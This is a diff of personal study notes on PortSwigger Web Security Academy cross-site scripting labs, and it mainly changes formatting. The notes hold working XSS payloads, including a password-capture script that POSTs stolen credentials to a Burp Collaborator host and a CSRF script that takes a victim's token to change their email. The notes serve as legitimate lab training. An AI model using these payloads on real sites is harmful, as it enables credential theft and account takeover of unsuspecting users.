@@ -2479,12 +2479,12 @@ Content-Type: application/json
      `<iframe src="https://0a3d00fc042cd7f58369c88600d00092.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`  
 4. Reflected XSS into HTML context with **all tags blocked except custom ones**
    - This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.
-   - `><body onresize=print()><script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>`
+   - `><body onresize=print()><script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>`  
    - Exploit server payload	
      ```
-     <script>
-	location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
-     </script>
+      <script>
+	 location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+      </script>
      ```
 5. Reflected XSS with **event handlers and href attributes blocked (Expert)**
    - you need to **label your vector with the word "Click"** in order to induce the simulated lab user to click your vector
@@ -2498,8 +2498,8 @@ Content-Type: application/json
 
 **XSS in HTML tag attributes**  
 7. Reflected XSS into **attribute with angle brackets** HTML-encoded  
-   - Test `he123"` <input type="text" placeholder="Search the blog..." name="search" `value="he123" "=""`>	
-   - `"onmouseover="alert(1)` >	`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">`
+   - Test `he123"` <input type="text" placeholder="Search the blog..." name="search" `value="he123" "=""`>  
+   - `"onmouseover="alert(1)` >	`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">`  
 8. Stored XSS into anchor **href attribute with double quotes** HTML-encoded  
    - <a id="author" `href="www.attacker1.com"`>attacker</a>
    - in website field, input `javascript:alert(1)` > `<a id="author" href="javascript:alert(1)">yuyu</a>`
@@ -2513,34 +2513,34 @@ Content-Type: application/json
 
 **XSS into JavaScript**  
 10. Reflected XSS into a JavaScript string with **single quote and backslash escaped**  
-    - **Terminating the existing script** `</script><img src=1 onerror=alert(document.domain)>`  
-    ```
-    <script>
+    - **Terminating the existing script** `</script><img src=1 onerror=alert(document.domain)>`     
+      ```
+      <script>
 	...
 	var input = 'controllable data here';
 	...
-    </script>
-    ```
-    - Test bad input
-    ```
-    single' backslash\' >  var searchTerms = 'single\' backslash\\\'';
-    ```
-    - break out of the script block and inject a new script
-    `</script><script>alert(1)</script>`  
+      </script>
+      ```  
+    - Test bad input  
+      ```
+      single' backslash\' >  var searchTerms = 'single\' backslash\\\'';
+       ```
+    - break out of the script block and inject a new script  
+      `</script><script>alert(1)</script>`  
 11. Reflected XSS into a JavaScript string with **angle brackets HTML encoded**  
     - Test bad input
-    ```
-    angle <> > var searchTerms = 'angle &lt;&gt;';
-    ```
+      ```
+      angle <> > var searchTerms = 'angle &lt;&gt;';
+      ```
     - Breaking out of a JavaScript string
     - Input `'-alert(1)-'`, XSS success `var searchTerms = ''-alert(1)-'';`  
 12. Reflected XSS into a JavaScript string with **angle brackets and double quotes HTML-encoded** and **single quotes escaped**
     - Test bad input
-    ```
-    hello<> > var searchTerms = 'hello&lt;&gt;';
-    hello" >  var searchTerms = 'hello&quot;';
-    hello' >  var searchTerms = 'hello\'';  
-    ```
+      ```
+      hello<> > var searchTerms = 'hello&lt;&gt;';
+      hello" >  var searchTerms = 'hello&quot;';
+      hello' >  var searchTerms = 'hello\'';  
+      ```
     - break out of the JavaScript string and inject an alert
       `\'-alert(1)//` > `var searchTerms = '\\'-alert(1)//';`
     - the **single quote** (') ends a string in JavaScript prematurely, and **alert(1)** is then executed as a separate command. The **//** part is used to comment out the rest of the JavaScript line  
@@ -2556,12 +2556,12 @@ Content-Type: application/json
     - Overriding `toString: toString=x` 
     - Coercing window to a String: `window%2b%27%27` 
     - Ending the Payload: `{x:%27`    
-14. **Stored XSS into onclick event** with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped.  
+14. **Stored XSS into onclick event** with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped.    
     - Normal payload in href `<a id="author" href="https://www.attacker.com" onclick="var tracker={track(){}};tracker.track('https://www.attacker.com');">yuyu</a>`  
     - Test single quote `http://evil.com' +alert() + '` > `<a id="author" href="http://evil.com\' +alert() + \'" onclick="var tracker={track(){}};tracker.track('http://evil.com\' +alert() + \'');">yuyu</a>`  
-    - Use html entities `http://foo?&apos;-alert(1)-&apos;` > `<a id="author" href="http://foo?'-alert(1)-'"`  
+    - Use html entities `http://foo?&apos;-alert(1)-&apos;` > `<a id="author" href="http://foo?'-alert(1)-'"`    
 15. Reflected XSS into a **template literal** with angle brackets, single, double quotes, backslash and backticks Unicode-escaped  
-    - template literal in js var message = `0 search results for 'hello'`;
+    - template literal in js var message = `0 search results for 'hello'`;  
     - Input `${alert(1)}` > var message = `0 search results for '${alert(1)}'`;  
 
 **Client-side template injection**  
@@ -2607,23 +2607,23 @@ Content-Type: application/json
 19. Exploiting cross-site scripting to **capture passwords**  
     - Target password manager that performs **password auto-fill**	
     - Post comment and capture the password value in Burp Collaborator
-    ```
-    <input name=username id=username>
-    <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+      ```
+      <input name=username id=username>
+      <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
 	method:'POST',
 	mode: 'no-cors',
 	body:username.value+':'+this.value
 	});">
-    ```
-  - Exploiting XSS to perform **CSRF**
-  - Extract the CSRF token and change the victim's email address
-  - Post comment > who views the comment issue a POST request to change their email address to test@test.com	
-    ```
-    Repeater
-    POST /my-account/change-email
-    email=test%40normal-user.net&csrf=ZqNZdY3eSqvBYHiuBgDUiRAkX3OJ0Xw0
+      ```
+20. Exploiting XSS to perform **CSRF**
+    - Extract the CSRF token and change the victim's email address
+    - Post comment > who views the comment issue a POST request to change their email address to test@test.com	
+      ```
+      Repeater
+      POST /my-account/change-email
+      email=test%40normal-user.net&csrf=ZqNZdY3eSqvBYHiuBgDUiRAkX3OJ0Xw0
   
-    <script>
+      <script>
 	var req = new XMLHttpRequest();
 	req.onload = handleResponse;
 	req.open('get','/my-account',true);
@@ -2634,9 +2634,8 @@ Content-Type: application/json
 	    changeReq.open('post', '/my-account/change-email', true);
 	    changeReq.send('csrf='+token+'&email=test@test.com')
 	};
-    </script>
-    ```
-  
+      </script>
+      ```
 **Content security policy (CSP)**
 20. Reflected XSS protected by very **strict CSP**, with **dangling markup attack**
     - Burp steps not working: follow `https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/`  
